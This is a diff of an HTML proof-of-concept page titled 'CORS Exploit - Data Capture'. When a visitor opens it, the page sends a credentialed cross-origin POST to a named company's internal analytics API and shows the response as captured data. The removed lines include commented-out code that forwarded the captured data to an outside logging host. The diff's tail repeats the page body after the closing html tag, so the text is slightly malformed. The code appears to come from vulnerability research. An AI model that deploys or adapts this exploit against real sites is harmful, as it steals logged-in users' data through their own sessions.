@@ -10,54 +10,41 @@
         #response { white-space: pre-wrap; margin-top: 20px; }
     </style>
     <script>
-        // This function will make a POST request to the vulnerable API endpoint
         function exploit() {
             var xhr = new XMLHttpRequest();
-            
-            // Set up a POST request to the vulnerable endpoint
             xhr.open('POST', 'https://internal-api.monzo.com/analytics/track', true);
-            
-            // Allow credentials to be sent
             xhr.withCredentials = true;
+            xhr.setRequestHeader('Content-Type', 'application/json'); // Ensure correct content type
+            xhr.setRequestHeader('Accept', 'application/json'); // Expecting JSON response
 
-            // Set the necessary headers for the request
-            xhr.setRequestHeader('Content-Type', 'text/plain;charset=UTF-8');
+            // Update the data payload according to what the API expects
+            var data = JSON.stringify({ event: "test-event", validField: "validValue" }); // Adjust fields as needed
 
-            // Handle the response
             xhr.onload = function () {
                 if (xhr.status === 200) {
-                    // Capture the response data
                     var responseData = xhr.responseText;
-
-                    // Display the response data on the page
                     document.getElementById('response').textContent = 'Captured Data:\n' + responseData;
-
-                    // Optionally, send the captured response to your server for analysis
-                    // fetch('https://testingcors.site/log', {
-                    //     method: 'POST',
-                    //     body: JSON.stringify({ data: responseData }),
-                    //     headers: { 'Content-Type': 'application/json' }
-                    // });
                 } else {
                     console.error('Request failed:', xhr.status, xhr.statusText);
                 }
             };
 
-            // Handle errors
             xhr.onerror = function () {
                 console.error('An error occurred during the request.');
             };
 
-            // Optionally, send some dummy data (you can customize this)
-            var data = JSON.stringify({ event: "test-event" });
-            xhr.send(data); // Send the POST request with the data
+            xhr.send(data);
         }
 
-        // Automatically run the exploit when the page loads
         window.onload = exploit;
     </script>
 </head>
 <body>
+    <h1>CORS Exploit - Data Capture</h1>
+    <div id="response">Waiting for data...</div>
+</body>
+</html>
+
     <h1>CORS Exploit - Data Capture</h1>
     <div id="response">Waiting for data...</div>
 </body>
